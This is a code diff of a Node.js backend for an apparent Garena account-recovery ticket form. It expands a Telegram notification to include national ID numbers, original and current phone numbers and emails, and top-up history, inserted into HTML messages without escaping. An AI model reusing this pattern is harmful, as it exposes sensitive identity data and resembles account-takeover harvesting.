@@ -1,7 +1,7 @@
 /**
- * Backend Server V12.0 - Tích hợp MongoDB
+ * Backend Server V14.0 - Tích hợp MongoDB
  * @author Dev TanPhat
- * V12.0 - Báo lỗi Telegram "Loud Errors"
+ * V14.0 - Thêm thời gian gửi vào Telegram
  */
 
 // --- Import Dependencies ---
@@ -121,14 +121,14 @@ app.post('/submit-form', (req, res) => {
                 contactEmail: textData['contact-email'],
                 contactPhone: textData['contact-phone'],
                 fileName: fileData ? fileData.filename : null
+                // createdAt: Tự động thêm
             });
 
             // 3. Lưu vào Database (MỚI)
             await newTicket.save();
             console.log(`[DB] Đã lưu phiếu mới: ${ticketId}`);
 
-            // 4. [SỬA LỖI V12.0] Gửi thông báo Telegram (CHỜ)
-            // Phải "await" (chờ) cho đến khi nó gửi xong
+            // 4. Gửi thông báo Telegram (CHỜ)
             await sendTelegramNotification(newTicket, fileData);
             
             // 5. Trả Mã Tra Cứu về cho người dùng (MỚI)
@@ -181,15 +181,38 @@ app.get('/lookup-ticket/:id', async (req, res) => {
 // --- Telegram Service (Nâng cấp) ---
 async function sendTelegramNotification(ticket, fileData) {
     
+    // [SỬA LỖI V13.0] Thêm helper function f()
+    const f = (field) => (field ? field : 'Không điền');
+
+    // [SỬA LỖI V14.0] Thêm thời gian gửi
+    const submissionTime = new Date(ticket.createdAt).toLocaleString('vi-VN', {
+        timeZone: 'Asia/Ho_Chi_Minh',
+        dateStyle: 'short',
+        timeStyle: 'medium'
+    });
+
     let message = `<b>🔥 Yêu cầu Hỗ trợ Mới - ${ticket.ticketId} 🔥</b>\n\n`;
-    message += `<b>Tên đăng nhập Garena:</b> <pre>${ticket.garenaId || 'Không điền'}</pre>\n`;
-    message += `<b>Ngày mất TK:</b> ${ticket.dateLost || 'Không điền'}\n\n`;
+    message += `<b>Thời gian gửi:</b> ${submissionTime}\n\n`; // <-- DÒNG MỚI
+    message += `<b>Tên đăng nhập Garena:</b> <pre>${f(ticket.garenaId)}</pre>\n`;
+    message += `<b>Ngày mất TK:</b> ${f(ticket.dateLost)}\n\n`;
+
+    message += `<b>--- Thông tin xác thực gốc ---</b>\n`;
+    message += `<b>SĐT đầu tiên:</b> <pre>${f(ticket.firstPhone)}</pre>\n`;
+    message += `<b>Email đầu tiên:</b> <pre>${f(ticket.firstEmail)}</pre>\n`;
+    message += `<b>SĐT hiện tại (trước khi mất):</b> <pre>${f(ticket.currentPhone)}</pre>\n`;
+    message += `<b>Email hiện tại (trước khi mất):</b> <pre>${f(ticket.currentEmail)}</pre>\n`;
+    message += `<b>CCCD trong TK:</b> <pre>${f(ticket.accountCccd)}</pre>\n`;
+    message += `<b>Họ tên trong TK:</b> <pre>${f(ticket.accountName)}</pre>\n`;
+    message += `<b>Giao dịch nạp:</b>\n<pre>${f(ticket.transactions)}</pre>\n\n`;
+
     message += `<b>--- Thông tin liên hệ (Khách) ---</b>\n`;
-    message += `<b>Họ tên:</b> ${ticket.contactName || 'Không điền'}\n`;
-    message += `<b>Email:</b> <pre>${ticket.contactEmail || 'Không điền'}</pre>\n`;
-    message += `<b>SĐT:</b> <pre>${ticket.contactPhone || 'Không điền'}</pre>\n\n`;
+    message += `<b>Họ tên:</b> ${f(ticket.contactName)}\n`;
+    message += `<b>Email:</b> <pre>${f(ticket.contactEmail)}</pre>\n`;
+    message += `<b>SĐT:</b> <pre>${f(ticket.contactPhone)}</pre>\n`;
+    message += `<b>CCCD (để cập nhật):</b> <pre>${f(ticket.contactCccd)}</pre>\n\n`;
+    
     message += `<b>--- Chi tiết vấn đề ---</b>\n`;
-    message += `<pre>${ticket.description || 'Không điền'}</pre>\n\n`;
+    message += `<pre>${f(ticket.description)}</pre>\n`;
     
     const telegramApi = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
